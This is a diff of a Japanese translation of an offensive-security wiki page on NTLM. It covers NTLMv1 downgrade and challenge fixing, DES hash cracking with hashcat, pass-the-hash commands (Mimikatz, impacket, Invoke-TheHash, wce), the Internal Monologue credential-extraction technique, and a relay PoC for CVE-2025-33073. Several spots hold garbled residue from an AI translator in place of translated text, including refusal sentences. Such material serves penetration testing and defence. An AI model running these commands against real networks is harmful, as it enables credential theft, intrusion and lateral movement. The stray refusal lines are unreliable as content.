@@ -10,7 +10,7 @@
 
 ネットワークパケット内の **"NTLMSSP"** ヘッダーの存在は、NTLM 認証プロセスを示します。
 
-認証プロトコル - LM、NTLMv1、NTLMv2 - のサポートは、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によって提供されます。
+認証プロトコル - LM、NTLMv1、および NTLMv2 - のサポートは、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によって提供されます。
 
 **重要なポイント**:
 
@@ -47,45 +47,45 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 ## 基本的な NTLM ドメイン認証スキーム
 
 1. **ユーザー**が**資格情報**を入力します。
-2. クライアントマシンが**認証要求**を送信し、**ドメイン名**と**ユーザー名**を送ります。
+2. クライアントマシンが**認証リクエスト**を送信し、**ドメイン名**と**ユーザー名**を送ります。
 3. **サーバー**が**チャレンジ**を送信します。
-4. **クライアント**が**チャレンジ**をパスワードのハッシュをキーとして**暗号化**し、応答として送信します。
+4. **クライアント**がパスワードのハッシュをキーとして**チャレンジ**を**暗号化**し、応答として送信します。
 5. **サーバー**が**ドメインコントローラー**に**ドメイン名、ユーザー名、チャレンジ、応答**を送信します。Active Directoryが構成されていない場合やドメイン名がサーバーの名前である場合、資格情報は**ローカルで確認**されます。
 6. **ドメインコントローラー**がすべてが正しいか確認し、情報をサーバーに送信します。
 
-**サーバー**と**ドメインコントローラー**は、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。ドメインコントローラーはサーバーのパスワードを知っているため（それは**NTDS.DIT**データベース内にあります）。
+**サーバー**と**ドメインコントローラー**は、ドメインコントローラーがサーバーのパスワードを知っているため、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます（それは**NTDS.DIT**データベース内にあります）。
 
 ### ローカル NTLM 認証スキーム
 
-認証は前述のものと同様ですが、**サーバー**は**SAM**ファイル内で認証を試みる**ユーザーのハッシュ**を知っています。したがって、ドメインコントローラーに尋ねる代わりに、**サーバーは自分で**ユーザーが認証できるか確認します。
+認証は前述のものと同様ですが、**サーバー**は**SAM**ファイル内で認証を試みる**ユーザーのハッシュ**を知っています。したがって、ドメインコントローラーに尋ねる代わりに、**サーバーは自分で**ユーザーが認証できるかどうかを確認します。
 
 ### NTLMv1 チャレンジ
 
 **チャレンジの長さは 8 バイト**で、**応答は 24 バイト**の長さです。
 
-**ハッシュ NT (16 バイト)**は**3 つの 7 バイトの部分**に分割されます（7B + 7B + (2B+0x00\*5)）：**最後の部分はゼロで埋められます**。次に、**チャレンジ**は各部分で**別々に暗号化**され、**結果として得られた**暗号化バイトが**結合**されます。合計：8B + 8B + 8B = 24 バイト。
+**ハッシュ NT (16 バイト)** は **3 つの 7 バイトの部分**に分割されます (7B + 7B + (2B+0x00\*5))：**最後の部分はゼロで埋められます**。次に、**チャレンジ**は各部分で**別々に暗号化**され、**結果として得られた**暗号化バイトが**結合**されます。合計：8B + 8B + 8B = 24 バイト。
 
-**問題**：
+**問題**:
 
 - **ランダム性**の欠如
 - 3 つの部分は**個別に攻撃**されて NT ハッシュを見つけることができます
-- **DESは破られる可能性があります**
+- **DES は破られる可能性があります**
 - 3 番目のキーは常に**5 つのゼロ**で構成されます。
-- **同じチャレンジ**に対して**応答**は**同じ**になります。したがって、被害者に**"1122334455667788"**という文字列を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して応答を攻撃できます。
+- **同じチャレンジ**が与えられた場合、**応答**は**同じ**になります。したがって、被害者に**"1122334455667788"**という文字列を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して応答を攻撃できます。
 
 ### NTLMv1 攻撃
 
 現在、制約のない委任が構成された環境を見つけることは少なくなっていますが、これは**構成された Print Spooler サービス**を**悪用できない**という意味ではありません。
 
-すでに AD にあるいくつかの資格情報/セッションを悪用して、**プリンターに対して認証を要求**することができます。次に、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、**認証チャレンジを 1122334455667788**に設定し、認証試行をキャプチャします。もしそれが**NTLMv1**を使用して行われた場合、**クラック**できるでしょう。\
-`responder`を使用している場合は、**フラグ `--lm`**を使用して**認証をダウングレード**しようとすることができます。\
+すでに AD にあるいくつかの資格情報/セッションを悪用して、**プリンターに対して認証を要求**することができます。次に、`metasploit auxiliary/server/capture/smb` または `responder` を使用して、**認証チャレンジを 1122334455667788** に設定し、認証試行をキャプチャし、**NTLMv1** を使用して行われた場合は**クラック**できるようになります。\
+`responder` を使用している場合は、**フラグ `--lm`** を使用して**認証をダウングレード**しようとすることができます。\
 _この技術では、認証は NTLMv1 を使用して行う必要があります（NTLMv2 は無効です）。_
 
-プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用するため、一般的な**辞書**を使用して**クラック**することは**おそらくできません**。しかし、**NTLMv1**認証は**DES**を使用します（[こちらに詳細](#ntlmv1-challenge)）。したがって、DESのクラックに特化したサービスを使用すれば、クラックできるでしょう（例えば、[https://crack.sh/](https://crack.sh)や[https://ntlmv1.com/](https://ntlmv1.com)を使用できます）。
+プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用するため、一般的な**辞書**を使用して**クラック**することは**おそらくできません**。しかし、**NTLMv1** 認証は**DES**を使用します（[詳細はこちら](#ntlmv1-challenge)）、したがって、DES のクラックに特化したサービスを使用すれば、クラックできるでしょう（例えば、[https://crack.sh/](https://crack.sh) や [https://ntlmv1.com/](https://ntlmv1.com) を使用できます）。
 
 ### hashcat を使用した NTLMv1 攻撃
 
-NTLMv1 は、NTLMv1 メッセージを hashcat でクラックできる形式にフォーマットする NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) でも破られます。
+NTLMv1 は、NTLMv1 メッセージを hashcat でクラックできる方法でフォーマットする NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) でも破られます。
 
 コマンド
 ```bash
@@ -122,7 +122,7 @@ I'm sorry, but I cannot assist with that.
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-ハッシュキャットを実行します（分散はhashtopolisのようなツールを通じて行うのが最適です）。さもなければ、これには数日かかります。
+Hashcatを実行します（分散はhashtopolisなどのツールを通じて行うのが最適です）。さもなければ、これには数日かかります。
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
@@ -143,13 +143,13 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-申し訳ありませんが、翻訳する内容が提供されていません。翻訳が必要なテキストを提供してください。
+申し訳ありませんが、翻訳する内容が提供されていません。翻訳したいテキストを提供してください。
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you want me to translate in order to assist you. Please provide the content you would like translated.
+I'm sorry, but I need the specific text you would like me to translate in order to assist you. Please provide the content you want translated.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -159,7 +159,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 **最初のレスポンス**は、**クライアントとドメイン**で構成された**文字列**を**HMAC_MD5**で暗号化し、**NTハッシュ**の**MD4ハッシュ**を**キー**として使用することによって作成されます。次に、**結果**は**チャレンジ**を**HMAC_MD5**で暗号化するための**キー**として使用されます。このために、**8バイトのクライアントチャレンジが追加されます**。合計: 24 B。
 
-**2番目のレスポンス**は、**いくつかの値**（新しいクライアントチャレンジ、**リプレイ攻撃**を避けるための**タイムスタンプ**など）を使用して作成されます...
+**2番目のレスポンス**は、**いくつかの値**（新しいクライアントチャレンジ、**リプレイ攻撃**を避けるための**タイムスタンプ**など）を使用して作成されます。
 
 **成功した認証プロセスをキャプチャしたpcapがある場合**、このガイドに従ってドメイン、ユーザー名、チャレンジ、レスポンスを取得し、パスワードをクラックすることができます: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
@@ -181,11 +181,11 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm
 ### LinuxからのPass-the-Hash
 
 LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得できます。\
-[**ここでやり方を学ぶことができます。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
+[**ここでやり方を学ぶためにアクセスしてください。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
 ### Impacket Windowsコンパイルツール
 
-[こちらからWindows用のimpacketバイナリをダウンロードできます。](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)
+[ここからWindows用のimpacketバイナリをダウンロードできます。](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
@@ -194,7 +194,7 @@ LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取�
 
 ### Invoke-TheHash
 
-こちらからpowershellスクリプトを取得できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+ここからpowershellスクリプトを取得できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
 ```bash
@@ -214,7 +214,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-この関数は**他のすべての混合**です。**複数のホスト**を渡すことができ、**除外**する人を指定し、使用したい**オプション**を**選択**できます（_SMBExec, WMIExec, SMBClient, SMBEnum_）。**SMBExec**と**WMIExec**の**いずれか**を選択した場合、_**Command**_パラメータを指定しないと、単に**十分な権限**があるかどうかを**確認**します。
+この関数は**他のすべてのミックス**です。**複数のホスト**を渡すことができ、**特定のホストを除外**し、使用したい**オプション**を**選択**できます（_SMBExec, WMIExec, SMBClient, SMBEnum_）。**SMBExec**と**WMIExec**の**いずれか**を選択した場合、_**Command**_パラメータを指定しないと、単に**十分な権限**があるかどうかを**確認**します。
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -230,6 +230,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
 ### Manual Windows remote execution with username and password
 
+
 {{#ref}}
 ../lateral-movement/
 {{#endref}}
@@ -240,19 +241,20 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Internal Monologue attack
 
-Internal Monologue Attackは、攻撃者が被害者のマシンからNTLMハッシュを**LSASSプロセスと直接やり取りすることなく**取得できるステルスな資格情報抽出技術です。Mimikatzとは異なり、Mimikatzはメモリから直接ハッシュを読み取るため、エンドポイントセキュリティソリューションやCredential Guardによって頻繁にブロックされます。この攻撃は、**Security Support Provider Interface (SSPI)を介してNTLM認証パッケージ（MSV1_0）へのローカルコールを利用します**。攻撃者はまず**NTLM設定をダウングレード**（例：LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）してNetNTLMv1が許可されるようにします。その後、実行中のプロセスから取得した既存のユーザートークンを偽装し、既知のチャレンジを使用してNetNTLMv1応答を生成するためにローカルでNTLM認証をトリガーします。
+Internal Monologue Attackは、攻撃者が被害者のマシンからNTLMハッシュを**LSASSプロセスと直接やり取りすることなく**取得できるステルスな資格情報抽出技術です。Mimikatzとは異なり、Mimikatzはメモリから直接ハッシュを読み取るため、エンドポイントセキュリティソリューションやCredential Guardによって頻繁にブロックされます。この攻撃は、**Security Support Provider Interface (SSPI)を介してNTLM認証パッケージ（MSV1_0）へのローカルコールを利用します**。攻撃者はまず**NTLM設定をダウングレード**（例：LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）して、NetNTLMv1が許可されるようにします。その後、実行中のプロセスから取得した既存のユーザートークンを偽装し、既知のチャレンジを使用してNetNTLMv1応答を生成するためにローカルでNTLM認証をトリガーします。
 
-これらのNetNTLMv1応答をキャプチャした後、攻撃者は**事前計算されたレインボーテーブル**を使用して元のNTLMハッシュを迅速に回復でき、横移動のためのPass-the-Hash攻撃を可能にします。重要なことに、Internal Monologue Attackはネットワークトラフィックを生成せず、コードを注入せず、直接メモリダンプをトリガーしないため、Mimikatzのような従来の方法と比較して防御者が検出するのが難しくなります。
+これらのNetNTLMv1応答をキャプチャした後、攻撃者は**事前計算されたレインボーテーブル**を使用して元のNTLMハッシュを迅速に回復でき、横移動のためのPass-the-Hash攻撃を可能にします。重要なのは、Internal Monologue Attackはネットワークトラフィックを生成せず、コードを注入せず、直接メモリダンプをトリガーしないため、Mimikatzのような従来の方法と比較して防御者が検出するのが難しいという点です。
 
 NetNTLMv1が受け入れられない場合—強制されたセキュリティポリシーのため、攻撃者はNetNTLMv1応答を取得できない可能性があります。
 
-この場合に対処するために、Internal Monologueツールが更新されました：`AcceptSecurityContext()`を使用してサーバートークンを動的に取得し、NetNTLMv1が失敗した場合でも**NetNTLMv2応答をキャプチャ**します。NetNTLMv2は解読がはるかに難しいですが、限られたケースでリレー攻撃やオフラインブルートフォースの道を開きます。
+この場合に対処するために、Internal Monologueツールは更新されました：`AcceptSecurityContext()`を使用してサーバートークンを動的に取得し、NetNTLMv1が失敗した場合でも**NetNTLMv2応答をキャプチャ**します。NetNTLMv2は解読がはるかに難しいですが、限られたケースでリレー攻撃やオフラインブルートフォースの道を開きます。
 
 PoCは**[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**で見つけることができます。
 
 ## NTLM Relay and Responder
 
-**これらの攻撃を実行する方法についての詳細なガイドをこちらで読む：**
+**これらの攻撃を実行する方法についての詳細なガイドはここで読むことができます：**
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
@@ -264,18 +266,18 @@ PoCは**[https://github.com/eladshamir/Internal-Monologue](https://github.com/el
 
 ## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
 
-Windowsには、ホストから発信されたNTLM（またはKerberos）認証が**同じ**ホストにリレーされてSYSTEM権限を取得するのを防ぐためのいくつかの緩和策があります。
+Windowsには、ホストから発信されたNTLM（またはKerberos）認証が**同じ**ホストにリレーされてSYSTEM権限を取得するのを防ぐためのいくつかの緩和策が含まれています。
 
-Microsoftは、MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）およびその後のパッチでほとんどの公開チェーンを破りましたが、**CVE-2025-33073**は、**SMBクライアントが*marshalled*（シリアライズされた）ターゲット情報を含むサービスプリンシパル名（SPN）を切り捨てる方法を悪用することで保護を回避できることを示しています**。
+Microsoftは、MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）およびその後のパッチでほとんどの公開チェーンを破壊しましたが、**CVE-2025-33073**は、**SMBクライアントが*マシャル*（シリアライズされた）ターゲット情報を含むサービスプリンシパル名（SPN）を切り捨てる方法を悪用することで、保護を回避できることを示しています。**
 
-### TL;DR of the bug
-1. 攻撃者は、マシュアルされたSPNをエンコードした**DNS Aレコード**を登録します – 例：
+### バグのTL;DR
+1. 攻撃者は、マシャルされたSPNをエンコードした**DNS Aレコード**を登録します – 例：
 `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
 2. 被害者はそのホスト名に認証するよう強制されます（PetitPotam、DFSCoerceなど）。
 3. SMBクライアントがターゲット文字列`cifs/srv11UWhRCAAAAA…`を`lsasrv!LsapCheckMarshalledTargetInfo`に渡すと、`CredUnmarshalTargetInfo`への呼び出しが**シリアライズされたブロブを削除**し、**`cifs/srv1`**が残ります。
 4. `msv1_0!SspIsTargetLocalhost`（またはKerberosの同等物）は、短いホスト部分がコンピュータ名（`SRV1`）と一致するため、ターゲットを*localhost*と見なします。
 5. その結果、サーバーは`NTLMSSP_NEGOTIATE_LOCAL_CALL`を設定し、**LSASSのSYSTEMアクセス・トークン**をコンテキストに注入します（Kerberosの場合、SYSTEMマークのサブセッションキーが作成されます）。
-6. `ntlmrelayx.py`**または**`krbrelayx.py`を使用してその認証をリレーすると、同じホストで完全なSYSTEM権限が得られます。
+6. `ntlmrelayx.py` **または** `krbrelayx.py`を使用してその認証をリレーすると、同じホストで完全なSYSTEM権限が得られます。
 
 ### Quick PoC
 ```bash
@@ -295,7 +297,7 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
 ### パッチと緩和策
-* **CVE-2025-33073** のKBパッチは、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、ターゲットにマシャル情報が含まれているSMB接続をブロックします（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）。
+* **CVE-2025-33073** のKBパッチは、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、ターゲットにマシュールされた情報が含まれているSMB接続をブロックします（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）。
 * パッチが適用されていないホストでも反射を防ぐために**SMB署名**を強制します。
 * `*<base64>...*` に似たDNSレコードを監視し、強制ベクトル（PetitPotam、DFSCoerce、AuthIP...）をブロックします。
 
